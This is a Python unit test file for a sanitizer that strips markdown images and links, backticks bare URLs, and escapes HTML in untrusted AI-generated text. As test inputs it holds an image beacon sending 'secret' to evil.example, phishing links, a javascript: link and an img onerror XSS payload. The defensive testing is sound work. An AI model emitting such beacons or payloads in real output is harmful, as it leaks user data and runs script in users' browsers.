"""Unit tests for `safe_md` untrusted markdown/HTML sanitizer."""

from __future__ import annotations

from fleet_copilot.interfaces.ui.safe_md import safe_md


def test_safe_md_strips_markdown_images_to_alt_text() -> None:
    assert safe_md("See ![beacon](https://evil.example/p?d=secret) now") == "See beacon now"
    assert safe_md("Empty alt ![](https://evil.example/pixel.png)!") == "Empty alt !"
    assert (
        safe_md("Nested [![pic](https://evil.example/a.png)](https://evil.example/b)")
        == "Nested pic"
    )


def test_safe_md_strips_markdown_links_but_preserves_citation_handles() -> None:
    assert safe_md("Click [here](https://evil.example/phish) [E2]") == "Click here [E2]"
    assert (
        safe_md("Devices verified [E1], [E2], chart [C1], query [Q1].")
        == "Devices verified [E1], [E2], chart [C1], query [Q1]."
    )
    assert safe_md("[E1] (not a link)") == "[E1] (not a link)"
    assert safe_md("Bad [js](javascript:alert(1)) link") == "Bad js link"


def test_safe_md_neutralises_bare_http_urls_into_backticks() -> None:
    assert safe_md("Visit https://evil.example/x?a=1.") == "Visit `https://evil.example/x?a=1`."
    assert safe_md("Plain http://attacker.test/a and ok") == "Plain `http://attacker.test/a` and ok"


def test_safe_md_escapes_angle_brackets_outside_code_spans_only() -> None:
    assert (
        safe_md("<b>x</b><img src=x onerror=alert(1)>")
        == "&lt;b&gt;x&lt;/b&gt;&lt;img src=x onerror=alert(1)&gt;"
    )
    # Inline code spans are left completely untouched (no &lt; escaping inside backticks)
    assert (
        safe_md("Check `disk_free_pct < 15` and `<tag>` vs <b>raw</b>")
        == "Check `disk_free_pct < 15` and `<tag>` vs &lt;b&gt;raw&lt;/b&gt;"
    )
    # Fenced code blocks are left untouched too
    fenced = "Note <b>hi</b>\n```sql\nSELECT * FROM v WHERE x < 10 AND y > 1\n```"
    expected = "Note &lt;b&gt;hi&lt;/b&gt;\n```sql\nSELECT * FROM v WHERE x < 10 AND y > 1\n```"
    assert safe_md(fenced) == expected


def test_safe_md_handles_none_empty_and_angle_bracket_autolink() -> None:
    assert safe_md(None) == ""
    assert safe_md("") == ""
    res = safe_md("Exfil <https://evil.example/leak>")
    assert "<https://" not in res
    assert res == "Exfil &lt;`https://evil.example/leak`&gt;"
